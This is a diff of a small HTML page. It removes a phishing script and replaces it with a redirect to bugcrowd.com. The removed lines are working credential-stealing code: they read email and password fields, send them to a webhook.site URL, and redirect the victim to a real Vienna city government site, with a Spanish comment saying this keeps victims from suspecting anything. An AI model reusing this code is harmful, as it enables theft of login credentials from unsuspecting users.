@@ -1,16 +1,4 @@
 <!DOCTYPE html>
 <html><body><script>
-function send() {
-  var em = document.getElementById('em').value;
-  var pw = document.getElementById('pw').value;
-  fetch('https://webhook.site/1a2b7254-7b4f-4cfb-9954-ab6dd6b5935b', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: JSON.stringify({ email: em, pass: pw, ts: new Date().toISOString() })
-  });
-  // Redirigís al sitio real para que no sospechen
-  window.top.location = 'https://mitgestalten.wien.gv.at';
-}
-</script>
-</body>
-</html>
+  top.location.href = 'https://www.bugcrowd.com';
+</script></body></html>
